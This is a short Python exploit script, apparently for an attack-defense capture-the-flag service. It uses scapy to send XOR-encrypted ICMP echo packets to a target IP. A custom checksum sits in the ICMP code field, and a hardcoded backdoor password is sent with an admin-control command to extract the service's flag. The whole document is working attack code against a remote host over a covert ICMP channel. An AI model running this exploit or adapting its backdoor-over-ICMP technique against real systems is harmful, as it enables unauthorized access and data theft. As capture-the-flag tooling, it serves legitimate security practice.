#!/usr/bin/env python3
from enochecker import BrokenServiceException
from scapy.all import *
import sys
import argparse


def checksum(payload):
    s = 0
    for x,y in zip(*[iter(payload)]*2):
        s += (y << 8) | x
        s %= 2**16
    if len(payload) % 2 != 0:
        s += payload[len(payload)-1]
        s %= 2**16
    return ((s & 0xFF) + ((s & (0xFF << 8)) >> 8)) & 0xFF

def encrypt(var, key=0xba):
    return bytes(a ^ key for a in var)

class RemoteFunction:
    Uknown = b"\x00"
    AdmnCtrl = b"\x01"
    GetPassword = b"\x02"
    SetFlag = b"\x03"
    GetFlag = b"\x04"


def send(func, ip, body=b""):
    payload = func + body
    ip = IP(dst=ip)
    payload = encrypt(payload)
    p = ip / ICMP(type=8, code=checksum(payload))
    ans = sr1(p / Raw(load=payload), verbose=False, timeout=2)
    if ans is None:
        raise BrokenServiceException("Service is not reachable")
    payload = ans[Raw].load
    return encrypt(payload)


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("ip", help="dst ip of target to exploit")
    args = parser.parse_args()

    if args.ip is None:
        parser.print_help()
        sys.exit(1)

    pwd = b"::svm_kernel::repr_as_byte";
    flag = send(RemoteFunction.AdmnCtrl, args.ip, pwd)
    print("Flag through backdoor: ", flag.decode("ascii"))

